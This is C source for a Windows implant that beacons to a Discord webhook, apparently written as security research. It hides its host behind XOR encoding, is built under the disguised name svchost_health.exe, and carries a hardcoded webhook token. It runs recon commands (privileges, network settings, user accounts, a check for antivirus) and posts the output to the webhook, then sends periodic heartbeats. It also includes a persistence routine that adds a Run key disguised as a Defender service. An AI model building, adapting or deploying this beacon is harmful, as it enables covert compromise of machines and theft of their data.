/*
 * discord_implant_c.c — Discord Beacon (Native C, WinHTTP)
 * 22DIV / george wu — CSEC research, own hardware only
 *
 * POST-only Discord beacon. Sends recon + heartbeats via webhook.
 * Discord channel GET is blocked by TLS fingerprint (error 40333).
 * Interactive commands go via reverse shell (cheyanne_shell.c).
 *
 * Build:
 *   cl /O2 /Fe:svchost_health.exe discord_implant_c.c winhttp.lib advapi32.lib user32.lib
 */

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "winhttp.lib")

/* ══════════════════════════════════════════════════════════
 * CONFIG
 * ══════════════════════════════════════════════════════════ */

#define XK 0xAA

/* discord.com XOR 0xAA — verified */
static const unsigned char xHost[] = {
    0xCE,0xC3,0xD9,0xC9,0xC5,0xD8,0xCE,0x84,0xC9,0xC5,0xC7
};
#define xHost_LEN 11

static void xdecrypt(char *out, const unsigned char *enc, int len) {
    int i;
    for (i = 0; i < len; i++) out[i] = enc[i] ^ XK;
    out[len] = 0;
}

static char WEBHOOK_PATH[512] = "/api/webhooks/1518584521782722702/P-SIGTBJmyVLoywB0QiDu-9XLeHuKp9bcXBnXPVwtoIo3ttxXO51BslE1WEN5SonjMEr";
#define HB_INTERVAL 600000   /* 10 min — reduce channel spam */

/* ══════════════════════════════════════════════════════════
 * SESSION ID
 * ══════════════════════════════════════════════════════════ */

static char g_session[16];
static char g_hostname[64];
static char g_username[64];

static void gen_session(void) {
    DWORD tick = GetTickCount();
    DWORD nameLen = sizeof(g_hostname);
    GetComputerNameA(g_hostname, &nameLen);
    nameLen = sizeof(g_username);
    GetUserNameA(g_username, &nameLen);

    unsigned int hash = 5381;
    char *p;
    for (p = g_hostname; *p; p++) hash = ((hash << 5) + hash) + *p;
    for (p = g_username; *p; p++) hash = ((hash << 5) + hash) + *p;
    hash ^= tick;
    sprintf(g_session, "%08x", hash);
}

/* ══════════════════════════════════════════════════════════
 * HTTP (WinHTTP — POST only)
 * ══════════════════════════════════════════════════════════ */

static HINTERNET g_hSession = NULL;

static void http_init(void) {
    g_hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
}

static void http_cleanup(void) {
    if (g_hSession) WinHttpCloseHandle(g_hSession);
}

static void dbg(const char *msg) {
    FILE *f = fopen("C:\\Users\\Public\\chey_dbg.log", "a");
    if (f) { fprintf(f, "%s\n", msg); fclose(f); }
}

static int webhook_post(const char *json_body) {
    char host[64];
    xdecrypt(host, xHost, xHost_LEN);

    wchar_t whost[64], wpath[512];
    MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, 64);
    MultiByteToWideChar(CP_UTF8, 0, WEBHOOK_PATH, -1, wpath, 512);

    if (!g_hSession) return -1;

    HINTERNET hConn = WinHttpConnect(g_hSession, whost, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConn) return -1;

    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", wpath, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hConn); return -1; }

    DWORD bodyLen = (DWORD)strlen(json_body);
    BOOL sent = WinHttpSendRequest(hReq,
        L"Content-Type: application/json\r\n", (DWORD)-1L,
        (LPVOID)json_body, bodyLen, bodyLen, 0);

    if (sent) {
        WinHttpReceiveResponse(hReq, NULL);
        DWORD status = 0, sz = sizeof(status);
        WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &status, &sz, NULL);
        char m[64]; sprintf(m, "POST %lu", status); dbg(m);
    }

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    return 0;
}

/* ══════════════════════════════════════════════════════════
 * JSON BUILDER
 * ══════════════════════════════════════════════════════════ */

static void build_json(char *out, int outsz, const char *type, const char *data) {
    char escaped[4096];
    int ei = 0;
    const char *s;
    for (s = data; *s && ei < (int)sizeof(escaped) - 8; s++) {
        if (*s == '"') { escaped[ei++] = '\\'; escaped[ei++] = '"'; }
        else if (*s == '\\') { escaped[ei++] = '\\'; escaped[ei++] = '\\'; }
        else if (*s == '\n') { escaped[ei++] = '\\'; escaped[ei++] = 'n'; }
        else if (*s == '\r') { escaped[ei++] = '\\'; escaped[ei++] = 'r'; }
        else if (*s == '\t') { escaped[ei++] = '\\'; escaped[ei++] = 't'; }
        else escaped[ei++] = *s;
    }
    escaped[ei] = 0;
    if (ei > 1500) escaped[1500] = 0;

    snprintf(out, outsz,
        "{\"content\":\"{\\\"type\\\":\\\"%s\\\",\\\"session\\\":\\\"%s\\\","
        "\\\"hostname\\\":\\\"%s\\\",\\\"data\\\":\\\"%s\\\"}\"}",
        type, g_session, g_hostname, escaped);
}

static void post_simple(const char *type) {
    char json[512];
    snprintf(json, sizeof(json),
        "{\"content\":\"{\\\"type\\\":\\\"%s\\\",\\\"session\\\":\\\"%s\\\","
        "\\\"hostname\\\":\\\"%s\\\"}\"}",
        type, g_session, g_hostname);
    webhook_post(json);
}

/* ══════════════════════════════════════════════════════════
 * COMMAND EXECUTION
 * ══════════════════════════════════════════════════════════ */

static char *run_cmd(const char *cmd, int timeout_ms) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hRead, hWrite;
    CreatePipe(&hRead, &hWrite, &sa, 0);
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    char cmdline[1024];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return _strdup("[ERROR] CreateProcess failed");
    }

    CloseHandle(hWrite);

    char *output = (char *)malloc(8192);
    DWORD total = 0, bytesRead;
    while (total < 8000) {
        if (!ReadFile(hRead, output + total, 8000 - total, &bytesRead, NULL) || bytesRead == 0)
            break;
        total += bytesRead;
    }
    output[total] = 0;

    WaitForSingleObject(pi.hProcess, timeout_ms);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
    return output;
}

/* ══════════════════════════════════════════════════════════
 * RECON
 * ══════════════════════════════════════════════════════════ */

static char *do_recon(void) {
    char *buf = (char *)malloc(8192);
    int pos = 0;

    pos += sprintf(buf + pos, "hostname: %s\nuser: %s\nos: Windows\npid: %lu\n",
                   g_hostname, g_username, (unsigned long)GetCurrentProcessId());

    char *r;
    r = run_cmd("whoami /priv", 10000);
    pos += snprintf(buf + pos, 8192 - pos, "\n--- whoami /priv ---\n%s", r);
    free(r);

    r = run_cmd("ipconfig", 10000);
    pos += snprintf(buf + pos, 8192 - pos, "\n--- ipconfig ---\n%s", r);
    free(r);

    r = run_cmd("net user", 10000);
    pos += snprintf(buf + pos, 8192 - pos, "\n--- net user ---\n%s", r);
    free(r);

    r = run_cmd("tasklist /FI \"IMAGENAME eq MsMpEng.exe\"", 10000);
    pos += snprintf(buf + pos, 8192 - pos, "\n--- tasklist (AV) ---\n%s", r);
    free(r);

    return buf;
}

/* ══════════════════════════════════════════════════════════
 * PERSISTENCE
 * ══════════════════════════════════════════════════════════ */

static const char *install_persist(void) {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);

    HKEY hKey;
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);
    if (res != ERROR_SUCCESS)
        return "[PERSIST ERROR] RegOpenKey failed";

    res = RegSetValueExA(hKey, "WindowsDefenderService", 0, REG_SZ,
        (BYTE *)exe_path, (DWORD)strlen(exe_path) + 1);
    RegCloseKey(hKey);

    if (res == ERROR_SUCCESS)
        return "[PERSIST] Added to HKCU Run key";
    return "[PERSIST ERROR] RegSetValue failed";
}

/* ══════════════════════════════════════════════════════════
 * MAIN — beacon loop (recon + heartbeat, no command poll)
 * Interactive commands via cheyanne_shell.c reverse shell.
 * ══════════════════════════════════════════════════════════ */

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR cmd, int show) {
    gen_session();
    http_init();

    char m[128];
    sprintf(m, "VADER beacon started. session=%s host=%s", g_session, g_hostname);
    dbg(m);

    /* recon + check in */
    char *recon_data = do_recon();
    char post_buf[4096];
    build_json(post_buf, sizeof(post_buf), "recon", recon_data);
    webhook_post(post_buf);
    free(recon_data);

    /* heartbeat loop */
    for (;;) {
        Sleep(HB_INTERVAL);
        post_simple("heartbeat");
    }

    http_cleanup();
    return 0;
}
